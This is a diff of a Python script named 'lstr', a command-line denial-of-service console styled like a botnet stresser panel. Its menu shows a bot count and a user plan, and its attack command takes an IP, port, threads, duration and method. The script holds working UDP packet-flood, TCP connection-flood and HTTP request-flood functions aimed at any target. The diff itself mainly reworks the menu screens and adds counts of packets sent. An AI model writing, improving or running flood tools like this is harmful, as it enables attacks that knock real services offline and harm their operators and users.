@@ -1,20 +1,18 @@
 #!/usr/bin/env python3
 # ================================================
-# lstr – STOL3N/MEV NET CONSOLE (RED/WHITE ONLY)
+# lstr – STOL3N/MEV NET CONSOLE (FULL NEW SCREEN)
 # ================================================
 
-import os, sys, socket, threading, random, time, struct
+import os, sys, socket, threading, random, time
 from concurrent.futures import ThreadPoolExecutor
 from datetime import datetime
 
-# ---------- ENABLE ANSI COLORS ON WINDOWS ----------
+# ---------- ENABLE ANSI COLORS ----------
 if os.name == 'nt':
-    os.system('')                     # enables \033[...] in cmd
+    os.system('')
 
 # ---------- COLORS ----------
-R = "\033[91m"   # RED
-W = "\033[97m"   # WHITE
-C = "\033[0m"    # RESET
+R = "\033[91m"; W = "\033[97m"; C = "\033[0m"
 
 # ---------- TOOL INFO ----------
 TOOL_NAME   = "lstr"
@@ -29,34 +27,127 @@ BANNER = f"""{R}
      / /   | | / __| | __| | '__|
     / /    | | \__ \ | |_  | |   
    /_/     |_| |___/  \__| |_|   
-  
+                                 
+ 
 {W} >>> {TOOL_NAME.upper()} NET <<<{C}
 """
 
-# ---------- HINT LINES (kept after every clear) ----------
-HINTS = f"""{W}>> type {R}help{C} for commands
->> type {R}methods{C} to see all methods
->> type {R}plan{C} to see your plan
+HINTS = f"""{W}>> type {R}help{C}
+>> type {R}methods{C}
+>> type {R}plan{C}
+>> type {R}exit{C}
 """
 
 # ---------- DYNAMIC TITLE ----------
-def set_title():
-    status = "ONLINE" if ATTACK_RUNNING else "IDLE"
-    title = f"lstr Net - Bots: {ACTIVE_BOTS} - Admin"
+def set_title(screen="HOME"):
+    status = "ATTACKING" if ATTACK_RUNNING else "IDLE"
+    title = f"lstr Net - Bots: {ACTIVE_BOTS} - {status} - {screen}"
     if os.name == 'nt':
         os.system(f'title {title}')
-    else:                               # Linux/macOS
+    else:
         sys.stdout.write(f'\33]0;{title}\a')
         sys.stdout.flush()
 
 # ---------- ATTACK STATE ----------
 ATTACK_RUNNING = False
 ATTACK_THREAD  = None
+ATTACK_STATS   = {"sent": 0, "target": "", "method": "", "start_time": 0}
 
 # ========================================
-# ATTACK METHODS
+# FULL SCREEN FUNCTIONS
 # ========================================
+def full_clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+def show_home():
+    full_clear()
+    print(BANNER)
+    print(HINTS)
+    set_title("HOME")
+
+def show_help():
+    full_clear()
+    print(f"""{W}
+{R}attack{C}  <ip> <port> <threads> <sec> <method>
+{R}stop{C}     stop attack
+{R}methods{C}  list methods
+{R}plan{C}     your access
+{R}home{C}     return to main
+{R}exit{C}     quit
+{W}""")
+    print(f"\n{W}Type {R}home{C} to return.")
+    set_title("HELP")
+
+def show_methods():
+    full_clear()
+    print(f"""{W}
+{R}UDP{C}   – Raw packet flood
+{R}TCP{C}   – Connection flood
+{R}HTTP{C}  – Request flood
+{W}""")
+    print(f"\n{W}Type {R}home{C} to return.")
+    set_title("METHODS")
+
+def show_plan():
+    full_clear()
+    print(f"""{W}
+{R}{USER.upper()}{W}
+{R}{ACTIVE_BOTS:,}{W}
+{R}{datetime.now().strftime('%H:%M:%S')}{W}
+{R}{'ATTACKING' if ATTACK_RUNNING else 'IDLE'}{W}
+{W}""")
+    print(f"\n{W}Type {R}home{C} to return.")
+    set_title("PLAN")
+
+def show_attack(ip, port, threads, duration, method):
+    global ATTACK_RUNNING, ATTACK_THREAD, ATTACK_STATS
+    if ATTACK_RUNNING:
+        full_clear()
+        print(f"{R}[!] Already attacking{C}\n")
+        print(f"{W}Type {R}home{C} to return.")
+        set_title("ERROR")
+        return
+    if method not in ATTACK_MAP:
+        full_clear()
+        print(f"{R}[!] Invalid method: {method}{C}\n")
+        print(f"{W}Type {R}home{C} to return.")
+        set_title("ERROR")
+        return
+
+    full_clear()
+    print(f"{W}[ATTACK LAUNCHED]\n")
+    print(f"    Target  : {R}{ip}:{port}{W}")
+    print(f"    Method  : {R}{method.upper()}{W}")
+    print(f"    Threads : {R}{threads}{W}")
+    print(f"    Duration: {R}{duration}s{W}\n")
+    print(f"{W}Attack running... Type {R}home{C} when done.\n")
+    set_title(f"ATTACK • {method.upper()}")
+
+    ATTACK_RUNNING = True
+    ATTACK_STATS = {
+        "sent": 0,
+        "target": f"{ip}:{port}",
+        "method": method.upper(),
+        "start_time": time.time()
+    }
+
+    def run():
+        ATTACK_MAP[method](ip, port, duration)
+        global ATTACK_RUNNING
+        ATTACK_RUNNING = False
+        print(f"\n{W}[ATTACK COMPLETE] Type {R}home{C} to return.")
+        set_title("HOME")
+
+    ATTACK_THREAD = threading.Thread(target=run, daemon=True)
+    ATTACK_THREAD.start()
+
+# ========================================
+# ATTACK METHODS (PRINT TO CURRENT SCREEN)
+# ========================================
+ATTACK_MAP = {}
+
 def udp_flood(ip, port, duration):
+    global ATTACK_STATS
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     payload = random._urandom(1490)
     sent = 0
@@ -65,13 +156,16 @@ def udp_flood(ip, port, duration):
         try:
             sock.sendto(payload, (ip, port))
             sent += 1
-            if sent % 5000 == 0:
-                print(f"{W}[UDP] {sent:,} to {ip}:{port}{C}")
+            ATTACK_STATS["sent"] = sent
+            if sent % 1000 == 0:
+                elapsed = int(time.time() - ATTACK_STATS["start_time"])
+                print(f"{W}[UDP] {sent:,} pkts | {elapsed}s → {ip}:{port}{C}")
         except:
             pass
-    print(f"{W}[UDP] Sent {sent:,} packets.{C}")
 
 def tcp_flood(ip, port, duration):
+    global ATTACK_STATS
+    sent = 0
     end = time.time() + duration
     while time.time() < end and ATTACK_RUNNING:
         try:
@@ -80,11 +174,15 @@ def tcp_flood(ip, port, duration):
             s.connect((ip, port))
             s.send(b"\x00" * 1024)
             s.close()
+            sent += 1
+            ATTACK_STATS["sent"] = sent
         except:
             pass
 
 def http_flood(ip, port, duration):
+    global ATTACK_STATS
     payload = f"GET /?{random.randint(0,999999)} HTTP/1.1\r\nUser-Agent: {TOOL_NAME}\r\n\r\n".encode()
+    sent = 0
     end = time.time() + duration
     while time.time() < end and ATTACK_RUNNING:
         try:
@@ -92,122 +190,88 @@ def http_flood(ip, port, duration):
             s.connect((ip, port))
             s.sendall(payload)
             s.close()
+            sent += 1
+            ATTACK_STATS["sent"] = sent
         except:
             pass
 
 ATTACK_MAP = {"udp": udp_flood, "tcp": tcp_flood, "http": http_flood}
 
 # ========================================
-# COMMANDS
-# ========================================
-def cmd_help():
-    print(f"""{W}
-COMMANDS:
-  {R}help{C}     – this menu
-  {R}methods{C}  – list attacks
-  {R}plan{C}     – your access info
-  {R}attack{C} <ip> <port> <threads> <sec> <method>
-  {R}stop{C}     – stop current attack
-  {R}clear{C}    – clear screen (keeps banner & hints)
-  {R}exit{C}     – quit
-{W}""")
-
-def cmd_methods():
-    print(f"{W}METHODS: {R}udp tcp http{C}")
-
-def cmd_plan():
-    print(f"""{W}
-PLAN:
-  User   : {R}{USER.upper()}{W}
-  Bots   : {R}{ACTIVE_BOTS:,}{W}
-  Time   : {R}{datetime.now().strftime('%H:%M:%S')}{W}
-  Status : {R}{'ONLINE' if ATTACK_RUNNING else 'IDLE'}{W}
-{W}""")
-
-def launch_attack(ip, port, threads, duration, method):
-    global ATTACK_RUNNING, ATTACK_THREAD
-    if ATTACK_RUNNING:
-        print(f"{R}[!] Attack already running – use 'stop'.{C}")
-        return
-    if method not in ATTACK_MAP:
-        print(f"{R}[!] Unknown method: {method}{C}")
-        return
-
-    print(f"{W}[+] {R}{method.upper()}{W} to {R}{ip}:{port}{W} | {R}{threads}{W} threads | {R}{duration}s{C}")
-    ATTACK_RUNNING = True
-    set_title()
-
-    def run():
-        with ThreadPoolExecutor(max_workers=threads) as pool:
-            for _ in range(threads):
-                pool.submit(ATTACK_MAP[method], ip, port, duration)
-        global ATTACK_RUNNING
-        ATTACK_RUNNING = False
-        print(f"{W}[+] Attack finished.{C}")
-        set_title()
-
-    ATTACK_THREAD = threading.Thread(target=run, daemon=True)
-    ATTACK_THREAD.start()
-
-def cmd_stop():
-    global ATTACK_RUNNING
-    if not ATTACK_RUNNING:
-        print(f"{R}[!] No attack running.{C}")
-        return
-    ATTACK_RUNNING = False
-    print(f"{R}[!] Stopping…{C}")
-    time.sleep(1.5)
-    print(f"{W}[+] Attack terminated.{C}")
-    set_title()
-
-# ========================================
 # MAIN LOOP
 # ========================================
 def main():
-    # Full clear only once at start
-    os.system('cls' if os.name == 'nt' else 'clear')
-    print(BANNER)
-    print(HINTS)
-    set_title()
+    show_home()
 
     while True:
         try:
-            line = input(f"{R}{USER}@{TOOL_NAME.lower()}{W}> {C}").strip().lower()
-            if not line: continue
-            cmd = line.split()
+            cmd_input = input(f"{R}{USER}@{TOOL_NAME.lower()}{W}> {C}").strip()
+            if not cmd_input:
+                continue
+            cmd = cmd_input.lower().split()
             action = cmd[0]
 
-            if action == "help":
-                cmd_help()
+            if action == "home":
+                show_home()
+
+            elif action == "help":
+                show_help()
             elif action == "methods":
-                cmd_methods()
+                show_methods()
             elif action == "plan":
-                cmd_plan()
-            elif action == "clear":
-                # *** ONLY CLEAR OUTPUT, KEEP BANNER + HINTS ***
-                os.system('cls' if os.name == 'nt' else 'clear')
-                print(BANNER)
-                print(HINTS)
-                set_title()
+                show_plan()
+
             elif action == "attack" and len(cmd) == 6:
                 try:
-                    ip, port, threads, dur, meth = cmd[1], int(cmd[2]), int(cmd[3]), int(cmd[4]), cmd[5]
-                    launch_attack(ip, port, threads, dur, meth)
-                except Exception:
-                    print(f"{R}[!] Bad args – attack <ip> <port> <threads> <sec> <method>{C}")
+                    ip = cmd[1]
+                    port = int(cmd[2])
+                    threads = int(cmd[3])
+                    duration = int(cmd[4])
+                    method = cmd[5]
+                    show_attack(ip, port, threads, duration, method)
+                except:
+                    full_clear()
+                    print(f"{R}[!] Invalid format{C}\n")
+                    print(f"{W}Type {R}home{C} to return.")
+                    set_title("ERROR")
+
             elif action == "stop":
-                cmd_stop()
+                if ATTACK_RUNNING:
+                    ATTACK_RUNNING = False
+                    full_clear()
+                    print(f"{R}[!] Attack stopped by user{C}\n")
+                    print(f"{W}Type {R}home{C} to return.")
+                    set_title("STOPPED")
+                else:
+                    full_clear()
+                    print(f"{R}[!] No attack running{C}\n")
+                    print(f"{W}Type {R}home{C} to return.")
+                    set_title("IDLE")
+
             elif action in ("exit", "quit"):
-                cmd_stop()
+                if ATTACK_RUNNING:
+                    ATTACK_RUNNING = False
+                full_clear()
                 print(f"{W}Shutting down…{C}")
+                time.sleep(1)
                 break
+
             else:
-                print(f"{R}?? unknown – type help{C}")
+                full_clear()
+                print(f"{R}?? unknown command{C}\n")
+                print(f"{W}Type {R}home{C} to return.")
+                set_title("ERROR")
 
         except KeyboardInterrupt:
-            print(f"\n{R}Ctrl‑C – use 'exit' to quit.{C}")
+            full_clear()
+            print(f"{R}Ctrl+C detected – use 'exit'{C}\n")
+            print(f"{W}Type {R}home{C} to return.")
+        except EOFError:
+            break
         except Exception as e:
-            print(f"{R}Error: {e}{C}")
+            full_clear()
+            print(f"{R}Error: {e}{C}\n")
+            print(f"{W}Type {R}home{C} to return.")
 
 if __name__ == "__main__":
     main()
